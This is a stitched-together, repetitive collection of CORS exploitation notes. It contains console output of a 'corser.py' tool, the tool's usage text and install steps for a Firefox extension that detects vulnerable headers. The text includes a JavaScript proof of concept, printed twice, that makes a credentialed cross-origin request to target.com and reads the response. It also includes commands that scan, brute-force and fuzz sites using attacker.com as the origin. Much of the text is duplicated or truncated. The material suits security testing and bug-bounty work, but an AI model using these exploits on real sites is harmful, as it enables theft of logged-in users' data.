    Exploit
    CORS POC Exploit
    Exploit
    CORS POC Exploit
    Exploit
EXP2:
    CORS EXP跨域测试
    CORS EXP跨域测试
PS C:\crossdomain> python corser.py -poc GET
[1;35m
____ ___ ____ ____ _____ ____
/ ___/ _ \| _ \/ ___|| ____| _ \
| | | | | | |_) \\___ \| _| | |_) |
| |__| |_| | _ 
    function cors() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200){
    document.getElementById("demo").innerHTML = alert(this.responseText);
    }
    };
    xhttp.open('GET', 'https://target.com/anything/?param1=value1&pram2=value2', true);
    xhttp.withCredentials = true;
    xhttp.send();
    }
    CORS POC
    Extract Information
    Exploit
PS C:\crossdomain> python corser.py -poc POST
[1;35m
____ ___ ____ ____ _____ ____
/ ___/ _ \| _ \/ ___|| ____| _ \
| | | | | | |_) \\___ \| _| | |_) |
| |__| |_| | _ 
    CORS POC
    Extract Information
    Exploit
Microsoft Windows [版本 10.0.17134.165]
(c) 2018 Microsoft Corporation。保留所有权利。
C:\Users\Mannix>cd C:\crossdomain
C:\crossdomain>python corser.py -poc GET
[1;35m
____ ___ ____ ____ _____ ____
/ ___/ _ \| _ \/ ___|| ____| _ \
| | | | | | |_) \\___ \| _| | |_) |
| |__| |_| | _ 
    function cors() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200){
    document.getElementById("demo").innerHTML = alert(this.responseText);
    }
    };
    xhttp.open('GET', 'https://target.com/anything/?param1=value1&pram2=value2', true);
    xhttp.withCredentials = true;
    xhttp.send();
    }
    CORS POC
    Extract Information
    Exploit
C:\crossdomain>python corser.py -poc POST
[1;35m
____ ___ ____ ____ _____ ____
/ ___/ _ \| _ \/ ___|| ____| _ \
| | | | | | |_) \\___ \| _| | |_) |
| |__| |_| | _ 
    CORS POC
    Extract Information
    Exploit
    CORS POC
    Extract Information
    Exploit
crossdomain
Checking for CORS misconfiguration
Usage: python corser.py -h
Scanning for list domains
python corser.py -list_domain ~/aquatone/target.com/urls.txt -origin
attacker.com
Bruteforce endpoints and then checking for cors
python corser.py -u https://target.com/ -list_endpoint
~/Desktop/listendpoint.txt -origin attacker.com
Trying to bypass origin when we encounter filter
python corser.py -u [https://target.com -origin attacker.com -fuzz
true](https://target.com%20-origin%20attacker.com%20-fuzz%20true)
## Gen Poc
python corser.py -poc GET
python corser.py -poc POST
additional options
-t : set number of threads
-header : custom your request if website requires authenticated cookie
ex: python corser.py -u https://target.com -header
“Cookie:sessid=123456;role=user, Authorization: zxbdGDH7438”
vuln-headers-extension
The extension currently detects URLs which are vulnerable to
CORS Misconfiguration
Host Header Injection
Missing X-XSS-Protection headers (commented in the code due to its low
severity)
Clickjacking support
Clone the repo or fork it.
Open Firefox and load about:debugging in the URL bar.
Click the Load Temporary Add-on button and select the manifest.json file in
your cloned repo.
Now the vuln-headers-extension is installed.
Once you install the extension you can see an icon in the tool bar.
Click on the icon and a new tab gets opened.
Leave it open and do your browsing/work.
The extension automatically logs all the vulnerable URLs to the new tab.
Now you can submit a report to the respective organisaiton and make it more
secure.